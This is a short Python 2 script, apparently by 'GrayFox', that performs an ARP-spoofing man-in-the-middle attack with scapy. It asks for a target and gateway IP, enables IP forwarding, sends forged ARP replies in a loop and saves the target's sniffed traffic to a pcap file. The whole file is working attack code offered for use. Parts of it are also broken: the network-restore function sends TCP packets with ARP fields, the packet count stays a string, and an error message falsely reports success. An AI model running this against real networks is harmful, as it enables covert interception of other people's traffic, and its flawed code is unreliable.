#ARPSPOOFING2.0
#Author: GrayFox 
#For team Cypher
#usr/env/python2
print ("""
$$$$$$$$\  $$$$$$\  $$$$$$$\  $$\   $$\ 
\__$$  __|$$  __$$\ $$  __$$\ $$ |  $$ |
   $$ |   $$ /  \__|$$ |  $$ |$$ |  $$ |
   $$ |   $$ |      $$$$$$$  |$$$$$$$$ |
   $$ |   $$ |      $$  ____/ $$  __$$ |
   $$ |   $$ |  $$\ $$ |      $$ |  $$ |
   $$ |   \$$$$$$  |$$ |      $$ |  $$ |
   \__|    \______/ \__|      \__|  \__|
Made By GrayFox""")
#Importations 
import sys, os, time
from scapy.all import *
import os
import signal
import sys
import threading
import time
#Showing the ARP protocols in your net 
os.system ("netstat -tupn | grep EST")
os.system ("sleep 7")
target = raw_input("Chosse IP>>>")
tunnel = raw_input("chosse the tunnel>>>")
packet = raw_input("Chosse the number of packets to send>>>")

#TCP hijacking parameters
gateway_ip = tunnel
target_ip = target 
packet_count = packet
conf.iface = "wlan0"
conf.verb = 0

#Given an IP, get the MAC. For Recieve the package
 
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Crafting the packet and sending 
#Threading start
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(TCP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(TCP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

#Keep sending false ARP replies to put our man in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started TCP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped TCP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Start the program
print("[*] Starting script: TJAcking.py")
print("[*] Enabling IP forwarding")
#Enable IP Forward on a MAC
os.system("sysctl -w net.inet.ip.forwarding=1")
print("[*] Gateway IP:"+tunnel)
print("[*] Target IP:"+target)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..In the same way, Hijacking has been succesfull, open your sniffer ;)")
    sys.exit(0)
else:
    print("[*] Gateway MAC address:"+gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address:"+target_mac)

#ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Sniff traffic
try:
    sniff_filter = "ip host " + target_ip
    print("[*] Starting network capture")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print("[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print("[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
sys.exit(0)
